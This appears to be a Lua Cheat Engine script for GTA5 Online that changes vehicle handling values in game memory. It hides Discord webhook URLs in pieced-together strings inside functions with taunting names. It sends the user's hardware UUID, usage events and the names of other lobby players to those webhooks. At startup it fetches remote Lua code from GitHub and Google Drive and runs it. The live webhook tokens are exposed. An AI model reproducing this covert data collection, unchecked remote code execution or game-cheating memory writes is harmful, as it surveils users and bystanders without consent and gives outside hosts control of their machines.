  --CUSTOM SETUPS v1.5.x

  function Main()
    InitURLInfo()
    InitLogHTTP()
    InitHWID()
    LaunchApp()
  end

  function SetURLs()
    TABLE_VERSION = 15
    version_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/versions.txt"
    GT3BOP_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/GT3BOP.lua"
    GTE_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/GTE.lua"
    HS_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/HS.lua"
    F1_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/F1BOP.lua"
    Fuel_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/Fuel.lua"
    --local Meme_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/Fuel.lua"
    HWID_url = "https://drive.google.com/uc?export=download&id=1cyu6nJI51kgzuvWjGDoYIjN__B2GN_MY"
    LOG_url = ICanSeeYourIPBastardsLMAO()
    REG_url = IAMTIGIMOTHERFUCKER()
    DEBUG_URL = "https://discord.com/api/webhooks/906971411778785310/ZVD-xBKV8IQGFwNcxUmF4BRf7Q7GMUkshGdpw7NoxLiUw92cA1Yn1f04hCwc7PBuOFv4"
  end

  function ICanSeeYourIPBastardsLMAO()
    local Encode = {}
    Encode[1] = "://"
    Encode[2] = "dis"
    Encode[3] = "cord"
    Encode[4] = ".com/"
    Encode[5] = "a"
    Encode[6] = "pi/"
    Encode[7] = "we"
    Encode[8] = "b"
    Encode[9] = "hoo"
    Encode[10] = "ks/"
    Encode[11] = "905925823876464741/"
    Encode[12] = "aIlSyfHvQdVIpccxjel"
    Encode[13] = "-ixNzCAaWxP9YysHlCTPCbKXx2ARSzdjBz3p498_u8GrIDOqe"
    local Coder = "https"..Encode[1]..Encode[2]..Encode[3]..Encode[4]..Encode[5]..Encode[6]..Encode[7]..Encode[8]..Encode[9]..Encode[10]..Encode[11]..Encode[12]..Encode[13]
    return Coder
  end

  function IAMTIGIMOTHERFUCKER()
    local Encode = {}
    Encode[1] = "://"
    Encode[2] = "dis"
    Encode[3] = "cord"
    Encode[4] = ".com/"
    Encode[5] = "a"
    Encode[6] = "pi/"
    Encode[7] = "we"
    Encode[8] = "b"
    Encode[9] = "hoo"
    Encode[10] = "ks/"
    Encode[11] = "905931123694129193/"
    Encode[12] = "pbbDaBg7aTzfZRuNQyMrf"
    Encode[13] = "o2IlAFZkvBtD9MBDRIEAR6wy3R2ksK_GqaRwc3pddBWd-45"
    local Coder = "https"..Encode[1]..Encode[2]..Encode[3]..Encode[4]..Encode[5]..Encode[6]..Encode[7]..Encode[8]..Encode[9]..Encode[10]..Encode[11]..Encode[12]..Encode[13]
    return Coder
  end

  function GetURLs()
    local http = getInternet()
    GT3BOP = http.getURL(GT3BOP_url)
    GTEBOP = http.getURL(GTE_url)
    HSBOP = http.getURL(HS_url)
    F1BOP = http.getURL(F1_url)
    FuelSet = http.getURL(Fuel_url)
    --Meme = http.getURL(Meme_url)
    HWID_res = http.getURL(HWID_url)
    Version_res = http.getURL(version_url)
    http.destroy()
  end

  function InitURLInfo()
    SetURLs()
    GetURLs()
  end

  function InitHWID()
    load(HWID_res)()
    NewUser=true
    DefinePCID()
  end

  function all_trim(s)
    return s:match"^%s*(.*)":match"(.-)%s*$"
  end

  function DefinePCID()
    local res
    local fh = assert(io.popen'wmic csproduct get uuid')
    result = fh:read'*a'
    fh:close()
    result = string.gsub(result,'UUID',"")
    HWID = all_trim(result)
    for i=1,#HWID_Array-1,2 do
     if HWID == HWID_Array[i] then
       messageDialog('Welcome back, '..HWID_Array[i+1],mtInformation,mbOk)
       Username ="User: "..HWID_Array[i+1]
       SendPack("Launched App",1,1)
       NewUser=false
       break
     end
    end
  end

  function InitLogHTTP()
    LogSender = getInternet()
    LOG_History=''
    Username=''
    ChangedSetup=false
  end

  function SendPack(DATA,DAY,TIME)
    local DataDay = ''
    local DataTime = ''
    if DAY ~= 0 then
      DataDay = " - "..(os.date("%x"))
    else
      DataDay = ""
    end
    if TIME ~= 0 then
      DataTime = " at "..(os.date("%X"))
    else
      DataTime = ""
    end
    LOG_History = Username.." - "..DATA..DataDay..DataTime
    LogSender.postURL(LOG_url,"content="..LOG_History)
  end

  function RegisterNewUser(ID)
    local DiscordNick = inputQuery('Enter your discord nickname#xxxx','','')
    if DiscordNick ~= nil then
      local REG_http = getInternet()
      local content = "New user launched Custom Setups \n"..DiscordNick.."\n"..ID.."\n"..(os.date("%x")).."\n"..(os.date("%X"))
      REG_http.postURL(REG_url,"content="..content)
      REG_http.destroy()
    else
      CloseCE()
    end
  end

  function SendDebug(DATA)
    LOG_History = DATA
    LogSender.postURL(DEBUG_URL,"content="..LOG_History)
  end

  function CheckForNewUser()
    if NewUser==true then
      RegisterNewUser(HWID)
      messageDialog("Adding you to whitelist is manual process, please be patient. Come back later",mtInformation,mbOk)
      CloseCE()
    end
  end

  function LaunchApp()
    CheckForNewUser()
    local result = Version_res
    if result then
      local version = tonumber(result:match("%d+"))
      if version ~= TABLE_VERSION then
        messageDialog("Please download latest version.", mtInformation, mbOK)
        CloseCE()
      else
        form_show(UDF1)
        openProcess('GTA5.exe')

        local pic = math.random(1,2)
        if pic == 1 then UDF1.Pic2.Visible=true
         elseif pic == 2 then UDF1.Pic4.Visible=true
        end

        UDF1.Caption="Custom Setups | Online v1.5.1"

        FirstCar = true
        PitMenu = 3

        InitFuelSettings()
        InitCrewChief()
        InitOffsets()
        InitSlipstreamFeature()
        SetCustomClassesArrays()
        DefineCustomClassesLabels()
        InitSettings()
        RunWeatherbot()
        RunCustomSlipStream()
        RunCustomSpotter()

        UDF1.BackToPitsButton.Visible = false
      end
    end
  end

  function InitFuelSettings()
    UDF1.FuelB.Enabled = false
    FuelSystemEnabled=false
    MixCurrent = 0
    CurrentCarMaxFuel = 0
    load(FuelSet)()
  end

  function InitCrewChief()
    Spotter=false
    CarStatus=false
    Weather=false
  end

  function InitOffsets()
    pCNetPlayerInfo = 0xA0
    pCNetPed = 0x1E8
    oNumPlayers = 0x180
    oRid = 0x090
    oName = 0xA4
    pCPed = 0x8
    pCPlayerInfo = 0x10C8
    pCNavigation = 0x30
    oPositionX = 0x50
    oPositionY = 0x54
    oPositionZ = 0x58
  end

  function InitSlipstreamFeature()
    EnableSlipStream=true
  end

  function Set (list)
    local set = {}
    for _, l in ipairs(list) do set[l] = true end
    return set
  end

  function SetCustomClassesArrays()
    GT3array = Set {'PARAGON','SPECTER','ELEGY2','CARBONIZ','DRAFTER','COQUETTE','SCHLAGEN','GROWLER','VECTRE'}
    GTEarray = Set {'COQUETTE4','SPECTER2','COMET6','ITALIGTO','CYPHER','ITALIRSX'}
    HSarray = Set {'VAGNER','krieger','VISIONE','EMERUS','TIGON','TYRANT'}
    F1array = Set {'FORMULA'}
    --Memearray = Set {MemeCurrent)
  end

  function DefineCustomClassesLabels()
    function DisableGT3Labels()
      UDF1.gt3Value.Enabled = false
      UDF1.gt3Label.Enabled = false
      UDF1.gt3DEC.Enabled = false
      UDF1.gt3INC.Enabled = false
    end

    function DisableGTELabels()
      UDF1.gtevalue.Enabled = false
      UDF1.gtelabel.Enabled = false
      UDF1.gtedec.Enabled = false
      UDF1.gteinc.Enabled = false
    end

    function DisableHSLabels()
      UDF1.hsvalue.Enabled = false
      UDF1.hslabel.Enabled = false
      UDF1.hsdec.Enabled = false
      UDF1.hsinc.Enabled = false
    end

    function DisableF1Labels()
      UDF1.F1Label.Enabled = false
      UDF1.F1DEC.Enabled = false
      UDF1.F1INC.Enabled = false
      UDF1.F1Value.Enabled = false
    end
  end

  function mark_MYRid()
   local contest = getAddressSafe('WorldPTR')

   local ridaddr = "[[[WorldPTR]+pCPed]+pCPlayerInfo]+oRid"

   local testy = readPointer(ridaddr)

   if not testy then
   else
	 markMyRid = testy
   end
  end

  function CheckLobbyParticipants()
    local CNetworkPlayerMgr=readPointer("PlayerCountPTR")
    local PlayerList = ""
    local count = 0

    for i=0,32,1 do
      local CNetGamePlayer = readPointer(CNetworkPlayerMgr + oNumPlayers + (i*8))
      if not CNetGamePlayer then goto continue end
      local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
      if not CPlayerInfo then goto continue end
      local CPed = readPointer(CPlayerInfo + pCNetPed)
      if not CPed or CPed == 0 then goto continue end
      local PName = readString(CPlayerInfo + oName)
      PlayerList = PlayerList.." "..PName
      count = count + 1
      ::continue::
    end
    if count >= 2 then
      SendPack(PlayerList, 0, 0)
    end
  end

  function FoundMyCurrentID()
    local CNetworkPlayerMgr=readPointer("PlayerCountPTR")
    if markMyRid == -1 then mark_MYRid() end

    for i=0,32,1 do
      local CNetGamePlayer = readPointer(CNetworkPlayerMgr + oNumPlayers + (i*8))
      if not CNetGamePlayer then goto continue end
      local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
      if not CPlayerInfo then goto continue end
      local CPed = readPointer(CPlayerInfo + pCNetPed)
      if not CPed or CPed == 0 then goto continue end
      local ORGRid = readPointer(CPlayerInfo + oRid)
      if ORGRid == markMyRid then
         MyIDNumber = i
         goto found
      end
      ::continue::
    end
    ::found::
  end

  function RescanUNK()
    if UNK ~= readQword("UnkPTR") then
      autoAssemble([[
        aobscanmodule(UnkPTR,GTA5.exe,48 39 3D ? ? ? ? 75 2D)
        registerSymbol(UnkPTR)
      ]])
      UnkPTR=getAddress('UnkPTR') UnkPTR=UnkPTR+readInteger(UnkPTR+3)+7
      unregisterSymbol('UnkPTR') registerSymbol('UnkPTR',UnkPTR,true)
      UNK = readQword("UnkPTR")
    end
  end

  function InitCar()
    if FirstCar == false then
       --SendPack("Handling was reseted due new car init",0,1)
       --LOG_History=LOG_History..CarNameCurrent.." Handling was resetes due new car Init - "..(os.date("%X")).."\n"
       ReturnDefaultsToPreviousCar()
    end
    autoAssemble([[
      aobscanmodule(WorldPTR,GTA5.exe,48 8B 05 ? ? ? ? 45 ? ? ? ? 48 8B 48 08 48 85 C9 74 07)
      registersymbol(WorldPTR)
      aobscanmodule(UnkPTR,GTA5.exe,48 39 3D ? ? ? ? 75 2D)
      registerSymbol(UnkPTR)
      aobscanmodule(PlayerCountPTR,GTA5.exe,48 8B 0D ? ? ? ? E8 ? ? ? ? 48 8B C8 E8 ? ? ? ? 48 8B CF)
      registersymbol(PlayerCountPTR)
    ]])

    addr=getAddress("WorldPTR")
    addr=addr+readInteger(addr+3)+7
    unregisterSymbol("WorldPTR")
    registerSymbol("WorldPTR", addr, true)
    UnkPTR=getAddress('UnkPTR') UnkPTR=UnkPTR+readInteger(UnkPTR+3)+7
    unregisterSymbol('UnkPTR') registerSymbol('UnkPTR',UnkPTR,true)
    addr=getAddress("PlayerCountPTR")
    addr=addr+readInteger(addr+3)+7
    unregisterSymbol("PlayerCountPTR")
    registerSymbol("PlayerCountPTR", addr, true)
    PlayerCountPTR = readQword("PlayerCountPTR")
    PTR = readQword("WorldPTR")
    UNK = readQword("UnkPTR")
    FoundMyCurrentID()

    UDF1.SetGarageButton.Enabled = true
    UDF1.FuelB.Enabled=true
    UDF1.EnterBoxButton.Enabled = false
    if FuelSystemEnabled==true then
      EnableFuel()
    end
    FormStatus()
    UDF1.SetupNameLabel.Caption = "CURRENT SETUP: DEFAULT"
    if PositionCherer ~= nil then
      PositionChecker.destroy()
    end
    GetDefaults()
    DisplayInfo()
    if GT3array[CarNameCurrent]  then
      UDF1.gt3Value.Enabled = true
      UDF1.gt3Label.Enabled = true
      UDF1.gt3DEC.Enabled = true
      UDF1.gt3INC.Enabled = true
      DisableGTELabels()
      DisableHSLabels()
      DisableF1Labels()
      UDF1.CarGT3Icon.Visible = true
      UDF1.CarGTEIcon.Visible = false
      UDF1.CarLMPIcon.Visible = false
      UDF1.CarFormulaIcon.Visible = false
      UDF1.CarNoClassIcon.Visible = false
      CurrentCarMaxFuel = GT3Tank
      MixCurrent = GT3mix
    elseif GTEarray[CarNameCurrent]  then
      UDF1.gtevalue.Enabled = true
      UDF1.gtelabel.Enabled = true
      UDF1.gtedec.Enabled = true
      UDF1.gteinc.Enabled = true
      DisableGT3Labels()
      DisableHSLabels()
      DisableF1Labels()
      UDF1.CarGT3Icon.Visible = false
      UDF1.CarGTEIcon.Visible = true
      UDF1.CarLMPIcon.Visible = false
      UDF1.CarFormulaIcon.Visible = false
      UDF1.CarNoClassIcon.Visible = false
      CurrentCarMaxFuel = GTETank
      MixCurrent = GTEmix
    elseif HSarray[CarNameCurrent]  then
      UDF1.hsvalue.Enabled = true
      UDF1.hslabel.Enabled = true
      UDF1.hsdec.Enabled = true
      UDF1.hsinc.Enabled = true
      DisableGT3Labels()
      DisableGTELabels()
      DisableF1Labels()
      UDF1.CarGT3Icon.Visible = false
      UDF1.CarGTEIcon.Visible = false
      UDF1.CarLMPIcon.Visible = true
      UDF1.CarFormulaIcon.Visible = false
      UDF1.CarNoClassIcon.Visible = false
      CurrentCarMaxFuel = HSTank
      MixCurrent = HSmix
    elseif F1array[CarNameCurrent]  then
      UDF1.F1Label.Enabled = true
      UDF1.F1DEC.Enabled = true
      UDF1.F1INC.Enabled = true
      UDF1.F1Value.Enabled = true
      DisableGT3Labels()
      DisableGTELabels()
      DisableHSLabels()
      UDF1.CarGT3Icon.Visible = false
      UDF1.CarGTEIcon.Visible = false
      UDF1.CarLMPIcon.Visible = false
      UDF1.CarFormulaIcon.Visible = true
      UDF1.CarNoClassIcon.Visible = false
      CurrentCarMaxFuel = F1Tank
      MixCurrent = F1mix
    else
      DisableGT3Labels()
      DisableGTELabels()
      DisableHSLabels()
      DisableF1Labels()
      UDF1.CarGT3Icon.Visible = false
      UDF1.CarGTEIcon.Visible = false
      UDF1.CarLMPIcon.Visible = false
      UDF1.CarFormulaIcon.Visible = false
      UDF1.CarNoClassIcon.Visible = true
      CurrentCarMaxFuel = UnclassedCarTank
      MixCurrent = UnclassedCarMix
    end
    HaveBox = false
    InThePit = true
    UDF1.FuelB.Enabled = false
    FuelDELTA = (CurrentCarMaxFuel/2)//1
    LoadFuel = FuelDELTA
    UDF1.FuelValue.Caption = FuelDELTA.."L"
    UDF1.ClassValue.Caption = "-"
    UDF1.ClassValue.Font.Color = ClDefault
    SendPack("New car init - "..CarNameCurrent,0,1)
  end

  function GetDefaults()
    GetAdr()
    GetVal()
    SetCurrent()
    SetDeltaDefault()
    FirstCar = false
    UDF1.SetupNameLabel.Caption = "Default"
  end

  function GetAdr()
    --HandlingADR = getAddress("[[PTR+8]+D30]+938")
    MassADR = getAddress("[[[PTR+8]+D30]+938]+C")
    DragADR = getAddress("[[[PTR+8]+D30]+938]+10")
    WeightDistADR = getAddress("[[[PTR+8]+D30]+938]+24")
    FWDADR = getAddress("[[[PTR+8]+D30]+938]+48")
    RWDADR = getAddress("[[[PTR+8]+D30]+938]+4C")
    GearsADR = getAddress("[[[PTR+8]+D30]+938]+50")
    DriveInertiaADR = getAddress("[[[PTR+8]+D30]+938]+54")
    UpShiftADR = getAddress("[[[PTR+8]+D30]+938]+58")
    DownShiftADR = getAddress("[[[PTR+8]+D30]+938]+5C")
    InitialDriveForceADR = getAddress("[[[PTR+8]+D30]+938]+60")
    MaxFlatVelADR = getAddress("[[[PTR+8]+D30]+938]+64")
    InitialMaxFlatVelADR = getAddress("[[[PTR+8]+D30]+938]+68")
    BrakeForceADR = getAddress("[[[PTR+8]+D30]+938]+6C")
    BrakeBiasFrontADR = getAddress("[[[PTR+8]+D30]+938]+74")
    BrakeBiasRearADR = getAddress("[[[PTR+8]+D30]+938]+78")
    SteeringLockADR = getAddress("[[[PTR+8]+D30]+938]+80")
    SteeringLockRatioADR = getAddress("[[[PTR+8]+D30]+938]+84")
    CurveMaxADR = getAddress("[[[PTR+8]+D30]+938]+88")
    CurveMaxRatioADR = getAddress("[[[PTR+8]+D30]+938]+8C")
    CurveMinADR = getAddress("[[[PTR+8]+D30]+938]+90")
    CurveMinRatioADR = getAddress("[[[PTR+8]+D30]+938]+94")
    CurveLateralADR = getAddress("[[[PTR+8]+D30]+938]+98")
    CurveLateralRatioADR = getAddress("[[[PTR+8]+D30]+938]+9C")
    SpringDeltaADR = getAddress("[[[PTR+8]+D30]+938]+A0")
    SpringDeltaRatioADR = getAddress("[[[PTR+8]+D30]+938]+A4")
    LowSpeedTractionADR = getAddress("[[[PTR+8]+D30]+938]+A8")
    FrontGripADR = getAddress("[[[PTR+8]+D30]+938]+B0")
    RearGripADR = getAddress("[[[PTR+8]+D30]+938]+B4")
    TractionLossMultADR = getAddress("[[[PTR+8]+D30]+938]+B8")
    SuspensionForceADR = getAddress("[[[PTR+8]+D30]+938]+BC")
    SuspensionBumpADR = getAddress("[[[PTR+8]+D30]+938]+C0")
    SuspensionReboundADR = getAddress("[[[PTR+8]+D30]+938]+C4")
    SuspensionRaiseADR = getAddress("[[[PTR+8]+D30]+938]+D0")
    SuspensionTravelADR = getAddress("[[[PTR+8]+D30]+938]+CC")
    FrontSpringADR = getAddress("[[[PTR+8]+D30]+938]+D4")
    RearSpringADR = getAddress("[[[PTR+8]+D30]+938]+D8")
    ARBForceADR = getAddress("[[[PTR+8]+D30]+938]+DC")
    FrontARBADR = getAddress("[[[PTR+8]+D30]+938]+E0")
    RearARBADR = getAddress("[[[PTR+8]+D30]+938]+E4")
    CollisionMultADR = getAddress("[[[PTR+8]+D30]+938]+F0")
    EngineMultADR = getAddress("[[[PTR+8]+D30]+938]+FC")
    --PetrolADR = getAddress("[[[PTR+8]+D30]+938]+100")
    ToeFrontADR = getAddress("[[[PTR+8]+D30]+938]+344")
    ToeRearADR = getAddress("[[[PTR+8]+D30]+938]+348")
    CamberFrontADR = getAddress("[[[PTR+8]+D30]+938]+34C")
    CamberRearADR = getAddress("[[[PTR+8]+D30]+938]+350")
    ModelFlagADR = getAddress("[[[PTR+8]+D30]+938]+124")
    HandlingFlagADR = getAddress("[[[PTR+8]+D30]+938]+128")
    AdvancedADR = getAddress("[[[PTR+8]+D30]+938]+36C")
    CastorADR = getAddress("[[[PTR+8]+D30]+938]+354")
    DownForceMultADR = getAddress("[[[PTR+8]+D30]+938]+14")
    VehHealthADR = getAddress("[[PTR+8]+D30]+844")
    EngineHealthADR = getAddress("[[PTR+8]+D30]+908")
    BodyHealthADR = getAddress("[[PTR+8]+D30]+844")
    CarNameADR = getAddress("[[[PTR+8]+D30]+20]+298")
    HeadlightADR = getAddress("[[PTR+8]+D30]+A14") --15
    XenonADR = getAddress("[[[PTR+8]+D30]+48]+3E1") --1
    XenonColorADR = getAddress("[[[PTR+8]+D30]+48]+406") --2 Proto 5 GT
    RoloFrontADR = getAddress("[[[PTR+8]+D30]+938]+E8")
    RoloRearADR = getAddress("[[[PTR+8]+D30]+938]+EC")
  end

  function GetVal()
    --HandlingDefault = readQword(HandlingADR)
    MassDefault = readFloat(MassADR)
    DragDefault = readFloat(DragADR)
    WeightDistDefault = readFloat(WeightDistADR)
    FWDDefault = readFloat(FWDADR)
    RWDDefault = readFloat(RWDADR)
    GearsDefault = readInteger(GearsADR)
    DriveInertiaDefault = readFloat(DriveInertiaADR)
    UpShiftDefault = readFloat(UpShiftADR)
    DownShiftDefault = readFloat(DownShiftADR)
    InitialDriveForceDefault = readFloat(InitialDriveForceADR)
    MaxFlatVelDefault = readFloat(MaxFlatVelADR)
    InitialMaxFlatVelDefault = readFloat(InitialMaxFlatVelADR)
    BrakeForceDefault = readFloat(BrakeForceADR)
    BrakeBiasFrontDefault = readFloat(BrakeBiasFrontADR)
    BrakeBiasRearDefault = readFloat(BrakeBiasRearADR)
    SteeringLockDefault = readFloat(SteeringLockADR)
    SteeringLockRatioDefault = readFloat(SteeringLockRatioADR)
    CurveMaxDefault = readFloat(CurveMaxADR)
    CurveMaxRatioDefault = readFloat(CurveMaxRatioADR)
    CurveMinDefault = readFloat(CurveMinADR)
    CurveMinRatioDefault = readFloat(CurveMinRatioADR)
    CurveLateralDefault = readFloat(CurveLateralADR)
    CurveLateralRatioDefault = readFloat(CurveLateralRatioADR)
    SpringDeltaDefault = readFloat(SpringDeltaADR)
    SpringDeltaRatioDefault = readFloat(SpringDeltaRatioADR)
    LowSpeedTractionDefault = readFloat(LowSpeedTractionADR)
    FrontGripDefault = readFloat(FrontGripADR)
    RearGripDefault = readFloat(RearGripADR)
    TractionLossMultDefault = readFloat(TractionLossMultADR)
    SuspensionForceDefault = readFloat(SuspensionForceADR)
    SuspensionBumpDefault = readFloat(SuspensionBumpADR)
    SuspensionReboundDefault = readFloat(SuspensionReboundADR)
    SuspensionRaiseDefault = readFloat(SuspensionRaiseADR)
    SuspensionTravelDefault = readFloat(SuspensionTravelADR)
    FrontSpringDefault = readFloat(FrontSpringADR)
    RearSpringDefault = readFloat(RearSpringADR)
    ARBForceDefault = readFloat(ARBForceADR)
    FrontARBDefault = readFloat(FrontARBADR)
    RearARBDefault = readFloat(RearARBADR)
    CollisionMultDefault = readFloat(CollisionMultADR)
    EngineMultDefault = readFloat(EngineMultADR)
    PetrolDefault = readFloat(PetrolADR)
    ToeFrontDefault = readFloat(ToeFrontADR)
    ToeRearDefault = readFloat(ToeRearADR)
    CamberFrontDefault = readFloat(CamberFrontADR)
    CamberRearDefault = readFloat(CamberRearADR)
    ModelFlagDefault = readBytes(ModelFlagADR)
    HandlingFlagDefault = readBytes(HandlingFlagADR)
    AdvancedDefault = readInteger(AdvancedADR)
    CastorDefault = readFloat(CastorADR)
    --VehHealthDefault = readFloat(VehHealth)
    --EngineHealthDefault = readFloat(EngineHealth)
    CarNameDefault = readString(CarNameADR)
    HeadlightDefault = readFloat(HeadlightADR)
    XenonDefault = readBytes(XenonADR)
    XenonColorDefault = readBytes(XenonColorADR)
    DownForceMultDefault = readFloat(DownForceMultADR)
    RoloFrontDefault = readFloat(RoloFrontADR)
    RoloRearDefault = readFloat(RoloRearADR)
  end

  function SetCurrent()
    --HandlingCurrent = HandlingDefault
    MassCurrent =  MassDefault
    DragCurrent =  DragDefault
    WeightDistCurrent =  WeightDistDefault
    --if InThePit==false then
     FWDCurrent =  FWDDefault
     RWDCurrent =  RWDDefault
    -- end
    DriveInertiaCurrent =  DriveInertiaDefault
    GearsCurrent =  GearsDefault
    UpShiftCurrent =  UpShiftDefault
    DownShiftCurrent =  DownShiftDefault
    InitialDriveForceCurrent =  InitialDriveForceDefault
    MaxFlatVelCurrent =  MaxFlatVelDefault
    InitialMaxFlatVelCurrent =  InitialMaxFlatVelDefault
    BrakeForceCurrent =  BrakeForceDefault
    BrakeBiasFrontCurrent =  BrakeBiasFrontDefault
    BrakeBiasRearCurrent =  BrakeBiasRearDefault
    SteeringLockCurrent =  SteeringLockDefault
    SteeringLockRatioCurrent =  SteeringLockRatioDefault
    CurveMaxCurrent =  CurveMaxDefault
    CurveMaxRatioCurrent =  CurveMaxRatioDefault
    CurveMinCurrent =  CurveMinDefault
    CurveMinRatioCurrent =  CurveMinRatioDefault
    CurveLateralCurrent =  CurveLateralDefault
    CurveLateralRatioCurrent =  CurveLateralRatioDefault
    SpringDeltaCurrent =  SpringDeltaDefault
    SpringDeltaRatioCurrent =  SpringDeltaRatioDefault
    LowSpeedTractionCurrent =  LowSpeedTractionDefault
    FrontGripCurrent = FrontGripDefault
    RearGripCurrent = RearGripDefault
    TractionLossMultCurrent = TractionLossMultDefault
    SuspensionForceCurrent =  SuspensionForceDefault
    SuspensionBumpCurrent =  SuspensionBumpDefault
    SuspensionReboundCurrent =  SuspensionReboundDefault
    SuspensionRaiseCurrent =  SuspensionRaiseDefault
    SuspensionTravelCurrent = SuspensionTravelDefault
    FrontSpringCurrent =  FrontSpringDefault
    RearSpringCurrent =  RearSpringDefault
    ARBForceCurrent =  ARBForceDefault
    FrontARBCurrent =  FrontARBDefault
    RearARBCurrent =  RearARBDefault
    CollisionMultCurrent =  CollisionMultDefault
    EngineMultCurrent =  EngineMultDefault
    --PetrolCurrent =  PetrolDefault
    ToeFrontCurrent =  ToeFrontDefault
    ToeRearCurrent =  ToeRearDefault
    CamberFrontCurrent =  CamberFrontDefault
    CamberRearCurrent =  CamberRearDefault
    ModelFlagCurrent =  ModelFlagDefault
    HandlingFlagCurrent =  HandlingFlagDefault
    AdvancedCurrent = AdvancedDefault
    CastorCurrent = CastorDefault
    CarNameCurrent =  CarNameDefault
    HeadlingCurrent = HeadlightDefault
    XenonCurrent = XenonDefault
    XenonColorCurrent = XenonColorDefault
    DownForceMultCurrent = DownForceMultDefault
    RoloFrontCurrent = RoloFrontDefault
    RoloRearCurrent = RoloRearDefault
  end

  function SendValues(sender)
    writeFloat(MassADR,MassCurrent)
    writeFloat(DragADR,DragCurrent)
    writeFloat(WeightDistADR,WeightDistCurrent)
    --if InThePit==false then
      writeFloat(FWDADR,FWDCurrent)
      writeFloat(RWDADR,RWDCurrent)
    --end
    writeFloat(DriveInertiaADR,DriveInertiaCurrent)
    writeFloat(UpShiftADR,UpShiftCurrent)
    writeFloat(DownShiftADR,DownShiftCurrent)
    writeFloat(InitialDriveForceADR,InitialDriveForceCurrent)
    writeFloat(MaxFlatVelADR,MaxFlatVelCurrent)
    writeFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
    writeFloat(BrakeForceADR,BrakeForceCurrent)
    writeFloat(BrakeBiasFrontADR,BrakeBiasFrontCurrent)
    writeFloat(BrakeBiasRearADR,BrakeBiasRearCurrent)
    writeFloat(SteeringLockADR,SteeringLockCurrent)
    writeFloat(SteeringLockRatioADR,SteeringLockRatioCurrent)
    writeFloat(CurveMaxADR,CurveMaxCurrent)
    writeFloat(CurveMaxRatioADR,CurveMaxRatioCurrent)
    writeFloat(CurveMinADR,CurveMinCurrent)
    writeFloat(CurveMinRatioADR,CurveMinRatioCurrent)
    writeFloat(CurveLateralADR,CurveLateralCurrent)
    writeFloat(CurveLateralRatioADR,CurveLateralRatioCurrent)
    writeFloat(SpringDeltaADR,SpringDeltaCurrent)
    writeFloat(SpringDeltaRatioADR,SpringDeltaRatioCurrent)
    writeFloat(LowSpeedTractionADR,LowSpeedTractionCurrent)
    writeFloat(FrontGripADR,FrontGripCurrent)
    writeFloat(RearGripADR,RearGripCurrent)
    writeFloat(TractionLossMultADR,TractionLossMultCurrent)
    writeFloat(SuspensionForceADR,SuspensionForceCurrent)
    writeFloat(SuspensionBumpADR,SuspensionBumpCurrent)
    writeFloat(SuspensionReboundADR,SuspensionReboundCurrent)
    writeFloat(SuspensionRaiseADR,SuspensionRaiseCurrent)
    writeFloat(SuspensionTravelADR,SuspensionTravelCurrent)
    writeFloat(FrontSpringADR,FrontSpringCurrent)
    writeFloat(RearSpringADR,RearSpringCurrent)
    writeFloat(ARBForceADR,ARBForceCurrent)
    writeFloat(FrontARBADR,FrontARBCurrent)
    writeFloat(RearARBADR,RearARBCurrent)
    writeFloat(CollisionMultADR,CollisionMultCurrent)
    writeFloat(EngineMultADR,EngineMultCurrent)
    writeFloat(ToeFrontADR,ToeFrontCurrent)
    writeFloat(ToeRearADR,ToeRearCurrent)
    writeFloat(CamberFrontADR,CamberFrontCurrent)
    writeFloat(CamberRearADR,CamberRearCurrent)
    --writeFloat(HeadlightADR,HeadlightCurrent)
    --writeBytes(XenonADR,XenonCurrent)
    --writeBytes(XenonColorADR,XenonColorCurrent)
    writeBytes(ModelFlagADR,ModelFlagCurrent)
    writeBytes(HandlingFlagADR,HandlingFlagCurrent)
    writeInteger(AdvancedADR,AdvancedCurrent)
    writeFloat(CastorADR,CastorCurrent)
    writeFloat(DownForceMultADR,DownForceMultCurrent)
    writeFloat(RoloFrontADR,RoloFrontCurrent)
    writeFloat(RoloRearADR,RoloRearCurrent)
  end

  function ReturnDefaultsToPreviousCar()
    if CarNameCurrent~=nil then
      if GT3array[CarNameCurrent]  then
         UDF1.gt3Value.Enabled = false
         UDF1.gt3Label.Enabled = false
         UDF1.gt3DEC.Enabled = false
         UDF1.gt3INC.Enabled = false
      elseif GTEarray[CarNameCurrent]  then
         UDF1.gtevalue.Enabled = false
         UDF1.gtelabel.Enabled = false
         UDF1.gtedec.Enabled = false
         UDF1.gteinc.Enabled = false
      elseif HSarray[CarNameCurrent]  then
         UDF1.hsvalue.Enabled = false
         UDF1.hslabel.Enabled = false
         UDF1.hsdec.Enabled = false
         UDF1.hsinc.Enabled = false
      end
    if MassCurrent~=MassDefault then writeFloat(MassADR,MassDefault) end
    if DragCurrent~=DragDefault then writeFloat(DragADR,DragDefault) end
    if WeightDistCurrent~=WeightDistDefault then writeFloat(WeightDistADR,WeightDistDefault) end
    if readFloat(FWDADR)~= FWDDefault or FWDCurrent~=FWDDefault then writeFloat(FWDADR,FWDDefault) end
    if readFloat(RWDADR)~= RWDDefault or RWDCurrent~=RWDDefault then writeFloat(RWDADR,RWDDefault) end
    if DriveInertiaCurrent~=DriveInertiaDefault then writeFloat(DriveInertiaADR,DriveInertiaDefault) end
    if UpShiftCurrent~=UpShiftDefault then writeFloat(UpShiftADR,UpShiftDefault) end
    if DownShiftCurrent~=DownShiftDefault then writeFloat(DownShiftADR,DownShiftDefault) end
    if InitialDriveForceCurrent~=InitialDriveForceDefault then writeFloat(InitialDriveForceADR,InitialDriveForceDefault) end
    if MaxFlatVelCurrent~=MaxFlatVelDefault then writeFloat(MaxFlatVelADR,MaxFlatVelDefault) end
    if InitialMaxFlatVelCurrent~=InitialMaxFlatVelDefault then writeFloat(InitialMaxFlatVelADR,InitialMaxFlatVelDefault) end
    if readFloat(BrakeForceADR)~=BrakeForceDefault or BrakeForceCurrent~=BrakeForceDefault then writeFloat(BrakeForceADR,BrakeForceDefault) end
